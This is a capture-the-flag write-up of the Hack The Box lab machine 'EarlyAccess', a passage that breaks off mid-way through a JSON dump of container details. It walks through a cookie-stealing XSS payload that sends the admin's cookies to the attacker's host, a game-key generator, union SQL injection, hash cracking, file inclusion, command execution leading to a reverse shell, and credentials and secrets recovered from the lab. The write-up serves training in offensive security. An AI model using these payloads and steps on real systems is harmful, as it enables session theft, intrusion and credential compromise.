---
title:     "Hack The Box - EarlyAccess"
tags: [linux,hard,xss,crypto,sqli,hashcat,cracking,command injection,docker,dos,logic flaw,log poisoning,session poisoning]
categories: HackTheBox
---
[![info_card](/img/earlyaccess/info_card.png)](/img/earlyaccess/info_card.png)

# User

EarlyAccess is a hard rated machine on HackTheBox created by [Chr0x6eOs](https://www.hackthebox.eu/home/users/profile/134448). For the user part we will first abuse a XSS vulnerability in a contact form to obtain the admin's cookie. From there we can download a backup of a key verification script. This allows us to generate valid keys and register a game to access another vhost. On this vhost we discover an SQLI which results in hashes from the database, giving us access to yet another vhost after cracking. Fuzzing a parameter in a not yet fully implemented app we are able to include local files and get the source code of another functionality. Analyzing it we discover a possible RCE. Getting a shell the credentials from the database are reused and we are able to move laterally to another user. This user has api credentials stored in his `.wgetrc` which we can use to retrieve another set of credentials. This enables us to ssh into the machine and grab the user flag. For the root part we will abuse the restart of a docker container in which we can control the entrypoint script. The docker has a shared directory with the host which let's us copy a suid `sh` and escalate to root on the host system.

## Nmap

As usual we start our enumeration off with a nmap scan against all ports, followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.

`All ports`
```
$ sudo nmap -p- -T4 10.129.215.71
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-04 23:31 GMT
Nmap scan report for 10.129.215.71
Host is up (0.089s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 46.07 seconds
```

`Script and version`
```
$ sudo nmap -p22,80,443 -sC -sV 10.129.215.71
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-04 23:32 GMT
Nmap scan report for 10.129.215.71
Host is up (0.033s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to https://earlyaccess.htb/
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_ssl-date: TLS randomness does not represent time
|_http-title: EarlyAccess
|_http-server-header: Apache/2.4.38 (Debian)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
```


## XSS

The nmap scan show there are 3 ports open on the machine and it also leaks a hostname which we add to our `/etc/hosts`. Browsing to the page we see the homepage of a game which also lets us register an new user.

[![home_main](/img/earlyaccess/home_main.png)](/img/earlyaccess/home_main.png)

Being logged in after registering the web app has several functionalities. We can register a game key but we don't have a valid one yet. What looks interesting is that we can write a message to the administrator user.

[![logged_in](/img/earlyaccess/logged_in.png)](/img/earlyaccess/logged_in.png)

[![messaging](/img/earlyaccess/messaging.png)](/img/earlyaccess/messaging.png)

The subject and the body seem to get properly url encoded, the username paramter seems to be vulnerable to XSS though. To abuse this we first change our username to a XSS payload that grabs the admin's cookie.

[![user_xss](/img/earlyaccess/user_xss.png)](/img/earlyaccess/user_xss.png)

```html
<script>document.location='http://10.10.14.64/grabber.php?c='+document.cookie</script>
```

We set up our python webserver to retrieve the request and send a message.

[![send_message](/img/earlyaccess/send_message.png)](/img/earlyaccess/send_message.png)

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

After about a minute we get a reply containing the admin's cookie.

```
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.215.71 - - [05/Sep/2021 12:21:23] code 404, message File not found
10.129.215.71 - - [05/Sep/2021 12:21:23] "GET /grabber.php?c=XSRF-TOKEN=eyJpdiI6ImlWQ2prTCtRNmFObjlGbmNJazNFdlE9PSIsInZhbHVlIjoiRVh6UGZsaGlEdE9pRGg0LzRzQTV0bXBnUjdmSGZYRDJMRkFOc01Ud3dSb0RYUWlpajNlRWl4eEEreWVWK0QzRDNPeE1mZDFLS0FQbVJ0NHNZTVBGeWNiRWx1NjRMTDhWak5mRndKc2tuWFlBbmliYUZ0QXhaVU9iTGVzaU8rVEoiLCJtYWMiOiI5ZmU3ODJiZWJjZjZkOWMzMzA4YzBjOTlhMDNmNmYyZTQxM2FlNmY0OWFkZTEzMWQ3OGUyYzc3OWQ5YzRlYTc3In0%3D;%20earlyaccess_session=eyJpdiI6IlYxczlUQ0hFTXhsRVNHODJpK3hjdUE9PSIsInZhbHVlIjoiU3JvaFpDQWc3UVpSOS9NTFF6VmlJYktNY3F5dmVPblR0UEJvOFltTnBXQmZidTlCNzFQOS9PNFNjZ21nLzRHNHM5bEhkcUZ6Ry91amFvV1hXb1djWFJqK05hYUhuUE5ldEhOcStQczdIZlR2MkFRTWRNMW1xbWVNYkY5VGJIVkgiLCJtYWMiOiI4NjVkMjZlOWU3YjQ4NTI3YWI0ZWVlZmUxNWEwZDM4MDlhMDcxZGYyZjQ2Zjk4YTIxZGNmY2U4ZTI5ODUwY2VmIn0%3D HTTP/1.1" 404 -
```

Exchanging our cookies we are now logged in as admin and have access to an admin panel.

[![admin_panel](/img/earlyaccess/admin_panel.png)](/img/earlyaccess/admin_panel.png)

There are also additional `Game` and `Dev` blades which lead to different vhosts. Going over to game it seems we first need to register a valid game key to our account to access it.

[![game_key_needed](/img/earlyaccess/game_key_needed.png)](/img/earlyaccess/game_key_needed.png)

On dev it seems we can only log in with the admin's email address and password.

[![dev_login](/img/earlyaccess/dev_login.png)](/img/earlyaccess/dev_login.png)

What looks interesting though is that we have access to a backup validator app, which checks if the game key sent is valid. The page also mentions that the `magic_num` parameter is dynamically changed and needs to be synced with the api.

[![download_backup](/img/earlyaccess/download_backup.png)](/img/earlyaccess/download_backup.png)

## Generate Key

We download the backup and open the zip which only contains one python script.

```
$ unzip backup.zip
Archive:  backup.zip
  inflating: validate.py
```

There are five blocks in the game key and the script checks everyone of them after another. It also checks if the key passes a general regex check.

`validate.py`
```py
#!/usr/bin/env python3
import sys
from re import match

class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)

    def __init__(self, key:str, magic_num:int=346):
        self.key = key
        if magic_num != 0:
            self.magic_num = magic_num

    @staticmethod
    def info() -> str:
        return f"""
        # Game-Key validator #

        Can be used to quickly verify a user's game key, when the API is down (again).

        Keys look like the following:
        AAAAA-BBBBB-CCCC1-DDDDD-1234

        Usage: {sys.argv[0]} <game-key>"""

    def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

    def calc_cs(self) -> int:
        gs = self.key.split('-')[:-1]
        return sum([sum(bytearray(g.encode())) for g in gs])

    def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False
        for v in g1[3:]:
            try:
                int(v)
            except:
                return False
        return len(set(g1)) == len(g1)

    def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

    def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value:
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False

    def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

    def cs_valid(self) -> bool:
        cs = int(self.key.split('-')[-1])
        return self.calc_cs() == cs

    def check(self) -> bool:
        if not self.valid_format():
            print('Key format invalid!')
            return False
        if not self.g1_valid():
            return False
        if not self.g2_valid():
            return False
        if not self.g3_valid():
            return False
        if not self.g4_valid():
            return False
        if not self.cs_valid():
            print('[Critical] Checksum verification failed!')
            return False
        return True

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Key.info())
        sys.exit(-1)
    input = sys.argv[1]
    validator = Key(input)
    if validator.check():
        print(f"Entered key is valid!")
    else:
        print(f"Entered key is invalid!")
```

We can use this script to build our own key generator. For the first piece we can just check all possible combinations to pass the validator for the first 3 letters. The next 2 characters need to be numbers and have to be distinct ones. This results in something like `KEY01`. The second part checks if the byte value of the characters at even index is the same as the byte value of characters at odd index. A possible solution here is `0H0H0`. The next part has to start with `XP`, also the combined sum has to be the same as the `magic_num` parameter. Since we don't know this paramter we can generate all possible combinations for it. The fourth piece just has to result in a fixed value when xored with the first piece, which we can easily reverse. This means the fourth piece is `GAME1` in this case. The fifth piece is a checksum of the byte value of all other characters, so it has to be generated for all possible pieces in third place.

`gencode.py`
```py
import string

let = string.ascii_uppercase
num = '0123456789'
magic = []

a = set()

sum_ = ord('X') + ord('P')
# GEN FIRST
first = ''
for l1 in let:
   for l2 in let:
       for l3 in let:
           val = f'{l1}{l2}{l3}'
           res = [(ord(value) << index + 1) % 256 ^ ord(value) for index, value in enumerate(val)]
           if res == [221, 81, 145]:
               first = val + '01'

# GEN SECOND
second = '0H0H0'


# GEN THIRD
third = []
for l1 in let:
   for l2 in let:
    for n in num:
       combined = sum_ + ord(l1) + ord(l2) + ord(n)
       if combined not in a:
           a.add(combined)
           third.append((f'XP{l1}{l2}{n}'))

# GEN FOURTH

xor = [12, 4, 20, 117, 0]
fourth = ''.join([chr(x ^ ord(first[i])) for i, x in enumerate(xor)])

# GEN FIFTH AND PRINT
codes = []
for x in third:
    fifth = sum([sum(bytearray(part.encode())) for part in [first,second,x,fourth]])
    codes.append(f'{first}-{second}-{x}-{fourth}-{fifth}')
```

Running this script generates 60 valid keys for all possible values of `magic_num`.

```
$ python gencode.py > keys
```

To brute it we will use burp intruder since it deals with the session handling easily. We take a key in valid format and intercept the request.

[![get_intruder](/img/earlyaccess/get_intruder.png)](/img/earlyaccess/get_intruder.png)

Then we select the position we want to brute force and select our earlier generated list as sniper payload.

[![intruder_positions](/img/earlyaccess/intruder_positions.png)](/img/earlyaccess/intruder_positions.png)

[![intruder_payloads](/img/earlyaccess/intruder_payloads.png)](/img/earlyaccess/intruder_payloads.png)

The free version of intruder is quite slow but is enough in this case since it are only 60 requests. If it fails the `magic_num` might have been exchanged during the attack and we just have to run it again.

[![intruder_attack](/img/earlyaccess/intruder_attack.png)](/img/earlyaccess/intruder_attack.png)

## SQLI

After the attack finished we have now access to the game vhost where we can play a round of snake.

[![game_access](/img/earlyaccess/game_access.png)](/img/earlyaccess/game_access.png)

Failing gracefully at it and going to the scoreboard we see a quite descriptive sql error message. This is interesting since we still have our XSS payload with quotes as username indicating SQLI in the username parameter.

[![game_lost](/img/earlyaccess/game_lost.png)](/img/earlyaccess/game_lost.png)

[![query_broken](/img/earlyaccess/query_broken.png)](/img/earlyaccess/query_broken.png)

Changing our username we can fix the query proving control over the injection.

[![query_fixed](/img/earlyaccess/query_fixed.png)](/img/earlyaccess/query_fixed.png)

First we identify the column number to be three using union injection.

[![union_count](/img/earlyaccess/union_count.png)](/img/earlyaccess/union_count.png)

Next we need to find a coulmn where we can display text in to exfiltrate data. This works for the second column.

[![union_val](/img/earlyaccess/union_val.png)](/img/earlyaccess/union_val.png)

Now we can simply first extract the database scheme which only contains the `db` database next to the default.

[![sqli_schema](/img/earlyaccess/sqli_schema.png)](/img/earlyaccess/sqli_schema.png)

After this we can extract the tablenames inside the database. Here the `users` table looks like it could contain valuable information.

[![table_name](/img/earlyaccess/table_name.png)](/img/earlyaccess/table_name.png)

Checking the column names the suspicion seems to be right and in the next query we are able to retrieve the database hashes with emails and usernames.

[![coumn_name](/img/earlyaccess/coumn_name.png)](/img/earlyaccess/coumn_name.png)

[![users_table](/img/earlyaccess/users_table.png)](/img/earlyaccess/users_table.png)

If we are able to crack the admin hash we might be able to log into the dev vhost. Luckily for us it is a pretty weak password and cracks almost instantly.

```
$ hashcat -m 100 hash rockyou.txt
hashcat (v6.2.4) starting
```

```
618292e936625aca8df61d5fff5c06837c49e491:gameover

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 100 (SHA1)
Hash.Target......: 618292e936625aca8df61d5fff5c06837c49e491
Time.Started.....: Sun Sep  5 15:49:14 2021 (0 secs)
Time.Estimated...: Sun Sep  5 15:49:14 2021 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 49410.4 kH/s (4.55ms) @ Accel:2048 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 655360/14344388 (4.57%)
Rejected.........: 0/655360 (0.00%)
Restore.Point....: 0/14344388 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> grassroot
Hardware.Mon.#1..: Temp: 45c Fan: 33% Util: 38% Core:1569MHz Mem:4006MHz Bus:16

Started: Sun Sep  5 15:49:08 2021
Stopped: Sun Sep  5 15:49:15 2021
```

## LFI and RCE

Now we are able to log into the dev vhost. The page has two functionalities a file tool and a hashing tool.

[![dev_home](/img/earlyaccess/dev_home.png)](/img/earlyaccess/dev_home.png)

Checking out the source of the hash tool we see that the php scripts seem to be stored in the `/actions` folder.

[![hash_tool_source](/img/earlyaccess/hash_tool_source.png)](/img/earlyaccess/hash_tool_source.png)

Testing for the the file tool it is also present in the folder under the name `file.php`, we need a paramter to use it first though.

[![actions_file](/img/earlyaccess/actions_file.png)](/img/earlyaccess/actions_file.png)

Fuzzing for the parameter with ffuf we identify it to be `filepath`.

```
$ ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://dev.earlyaccess.htb/actions/file.php?FUZZ=file:///etc/passwd' -b 'PHPSESSID=c2100107ab69003402c0b47e4e7a34ce'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.earlyaccess.htb/actions/file.php?FUZZ=file:///etc/passwd
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=c2100107ab69003402c0b47e4e7a34ce
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

filepath                [Status: 200, Size: 1113, Words: 9, Lines: 22]
:: Progress: [2588/2588] :: Job [1/1] :: 515 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Using this parameter we are now able to retrieve the source code of `hash.php` with the `php://filter` wrapper to convert it to base64.

[![hash_source](/img/earlyaccess/hash_source.png)](/img/earlyaccess/hash_source.png)

The script takes multiple parameters. What is interesting is that it takes a function name as parameter and we can bypass the check for the function name by specifying a `debug` parameter. This makes it trivial to achieve RCE specifying `system` as `hash_function` parameter,  the command to execute as the `password` parameter and adding a `debug` parameter which can be anything.

`hash.php`
```php
<?php
include_once "../includes/session.php";

function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}

try
{
    if(isset($_REQUEST['action']))
    {
        if($_REQUEST['action'] === "verify")
        {
            // VERIFIES $password AGAINST $hash

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);

                $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
                header('Location: /home.php?tool=hashing');
                return;
            }
        }
        elseif($_REQUEST['action'] === "verify_file")
        {
            //TODO: IMPLEMENT FILE VERIFICATION
        }
        elseif($_REQUEST['action'] === "hash_file")
        {
            //TODO: IMPLEMENT FILE-HASHING
        }
        elseif($_REQUEST['action'] === "hash")
        {
            // HASHES $password USING $hash_function

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
                if(!isset($_REQUEST['redirect']))
                {
                    echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
                    echo '<br>' . $hash;
                    return;
                }
                else
                {
                    $_SESSION['hash'] = $hash;
                    header('Location: /home.php?tool=hashing');
                    return;
                }
            }
        }
    }
    // Action not set, ignore
    throw new Exception("");
}
catch(Exception $ex)
{
    if($ex->getMessage() !== "")
        $_SESSION['error'] = htmlentities($ex->getMessage());

    header('Location: /home.php');
    return;
}
?>
```

For this we first intercept the request with burp send it to repeater and set up our ncat listener.

[![hash_home](/img/earlyaccess/hash_home.png)](/img/earlyaccess/hash_home.png)

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

Now we can send the payload, get a reverse shell back, upgrade it with python and fix the terminal size.

[![hashtool_rce](/img/earlyaccess/hashtool_rce.png)](/img/earlyaccess/hashtool_rce.png)

```
$ nc -lnvp 7575
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.215.71.
Ncat: Connection from 10.129.215.71:37162.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<ons$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export TERM=xterm
export TERM=xterm
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ stty rows 55 columns 236
```

## Password reuse
Checking the home folder there is a `www-adm` user. Testing for password reuse we are able to change to it with the credentials `www-adm:gameover`.

```
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ls /home/
www-adm
```

```
www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ su www-adm
Password:
www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$
```

## API

Checking the users home directory there is a `.wgetrc` which contains a username and a password which hints at an api.

```
www-adm@webserver:~$ cat .wgetrc
user=api
password=s3CuR3_API_PW!
```

Checking a source file which seems to interact with the api we are able to identify a hostname and also a port.

```
www-adm@webserver:/var/www$ cat html/app/Models/API.php
<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\Http;

class API extends Model
{
    use HasFactory;

    /**
     * Verifies a game-key using the API
     *
     * @param String $key // Game-key to verify
     * @return string //Returns response from API
     */
    public static function verify_key(String $key) : string
    {
        try
        {
            $response = Http::get('http://api:5000/verify/' . $key);
            if (isset($response["message"]))
                return $response["message"];
            else
                return $response->body();
        }
        catch (\Exception $ex)
        {
            return "Unkown error: " . $ex->getMessage();
        }
    }
}
```

Specifying our found credentials and curling `/` on the api it seems `/check_db` could be very interesting.

```
www-adm@webserver:/var/www$ curl 'http://api:s3CuR3_API_PW!@api:5000/'
{"message":"Welcome to the game-key verification API! You can verify your keys via: /verify/<game-key>. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.","status":200}
```

Testing this we are able to retrieve a lot of information which we can bring into a nicer form using `jq`.

```
www-adm@webserver:/var/www$ curl 'http://api:s3CuR3_API_PW!@api:5000/check_db'
{"message":{"AppArmorProfile":"docker-default","Args":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Config":{"AttachStderr":false,"AttachStdin":false,"AttachStdout":false,"Cmd":["--character-set-server=utf8mb4","--collation-server=utf8mb4_bin","--skip-character-set-client-handshake","--max_allowed_packet=50MB","--general_log=0","--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES"],"Domainname":"","Entrypoint":["docker-entrypoint.sh"],"Env":["MYSQL_DATABASE=db","MYSQL_USER=drew","MYSQL_PASSWORD=drew","MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5","SERVICE_TAGS=dev","SERVICE_NAME=mysql","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.12","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.25-1debian10"],"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Healthcheck":{"Interval":5000000000,"Retries":3,"Test":["CMD-SHELL","mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent"],"Timeout":2000000000},"Hostname":"mysql","Image":"mysql:latest","Labels":{"com.docker.compose.config-hash":"947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"app","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/app","com.docker.compose.service":"mysql","com.docker.compose.version":"1.29.1"},"OnBuild":null,"OpenStdin":false,"StdinOnce":false,"Tty":true,"User":"","Volumes":{"/docker-entrypoint-initdb.d":{},"/var/lib/mysql":{}},"WorkingDir":""},"Created":"2021-09-05T00:29:53.539962676Z","Driver":"overlay2","ExecIDs":null,"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/dbbb3d6eba617105953fe62dbd2186f2b183dad96daf216d88c9ff50f4415a69-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff","MergedDir":"/var/lib/docker/overlay2/dbbb3d6eba617105953fe62dbd2186f2b183dad96daf216d88c9ff50f4415a69/merged","UpperDir":"/var/lib/docker/overlay2/dbbb3d6eba617105953fe62dbd2186f2b183dad96daf216d88c9ff50f4415a69/diff","WorkDir":"/var/lib/docker/overlay2/dbbb3d6eba617105953fe62dbd2186f2b183dad96daf216d88c9ff50f4415a69/work"},"Name":"overlay2"},"HostConfig":{"AutoRemove":false,"Binds":["app_vol_mysql:/var/lib/mysql:rw","/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro"],"BlkioDeviceReadBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceWriteIOps":null,"BlkioWeight":0,"BlkioWeightDevice":null,"CapAdd":["SYS_NICE"],"CapDrop":null,"Cgroup":"","CgroupParent":"","CgroupnsMode":"host","ConsoleSize":[0,0],"ContainerIDFile":"","CpuCount":0,"CpuPercent":0,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpuShares":0,"CpusetCpus":"","CpusetMems":"","DeviceCgroupRules":null,"DeviceRequests":null,"Devices":null,"Dns":null,"DnsOptions":null,"DnsSearch":null,"ExtraHosts":null,"GroupAdd":null,"IOMaximumBandwidth":0,"IOMaximumIOps":0,"IpcMode":"private","Isolation":"","KernelMemory":0,"KernelMemoryTCP":0,"Links":null,"LogConfig":{"Config":{},"Type":"json-file"},"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"Memory":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"NanoCpus":0,"NetworkMode":"app_nw","OomKillDisable":false,"OomScoreAdj":0,"PidMode":"","PidsLimit":null,"PortBindings":{},"Privileged":false,"PublishAllPorts":false,"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"],"ReadonlyRootfs":false,"RestartPolicy":{"MaximumRetryCount":0,"Name":"always"},"Runtime":"runc","SecurityOpt":null,"ShmSize":67108864,"UTSMode":"","Ulimits":null,"UsernsMode":"","VolumeDriver":"","VolumesFrom":[]},"HostnamePath":"/var/lib/docker/containers/1568b9c344969ca87933b006d08219036c22ee24213f2d11d2c56bb7781c23ca/hostname","HostsPath":"/var/lib/docker/containers/1568b9c344969ca87933b006d08219036c22ee24213f2d11d2c56bb7781c23ca/hosts","Id":"1568b9c344969ca87933b006d08219036c22ee24213f2d11d2c56bb7781c23ca","Image":"sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287","LogPath":"/var/lib/docker/containers/1568b9c344969ca87933b006d08219036c22ee24213f2d11d2c56bb7781c23ca/1568b9c344969ca87933b006d08219036c22ee24213f2d11d2c56bb7781c23ca-json.log","MountLabel":"","Mounts":[{"Destination":"/var/lib/mysql","Driver":"local","Mode":"rw","Name":"app_vol_mysql","Propagation":"","RW":true,"Source":"/var/lib/docker/volumes/app_vol_mysql/_data","Type":"volume"},{"Destination":"/docker-entrypoint-initdb.d","Mode":"ro","Propagation":"rprivate","RW":false,"Source":"/root/app/scripts/init.d","Type":"bind"}],"Name":"/mysql","NetworkSettings":{"Bridge":"","EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"HairpinMode":false,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"MacAddress":"","Networks":{"app_nw":{"Aliases":["mysql","1568b9c34496"],"DriverOpts":null,"EndpointID":"6dcc6c832c7bb6f73dd1b72e274a573afda1b6629850a3aa34a210c790162846","Gateway":"172.18.0.1","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAMConfig":{"IPv4Address":"172.18.0.100"},"IPAddress":"172.18.0.100","IPPrefixLen":16,"IPv6Gateway":"","Links":null,"MacAddress":"02:42:ac:12:00:64","NetworkID":"715423fd08f21f5f001cdbcf7c5ca8919dc5f2fbc8a1b2f4a2f945ffb5d22e66"}},"Ports":{"3306/tcp":null,"33060/tcp":null},"SandboxID":"b703de51256c13691227ca4e5165cc4463f25bee858d0d8579ef66ef9c9e3b0e","SandboxKey":"/var/run/docker/netns/b703de51256c","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null},"Path":"docker-entrypoint.sh","Platform":"linux","ProcessLabel":"","ResolvConfPath":"/var/lib/docker/containers/1568b9c344969ca87933b006d08219036c22ee24213f2d11d2c56bb7781c23ca/resolv.conf","RestartCount":0,"State":{"Dead":false,"Error":"","ExitCode":0,"FinishedA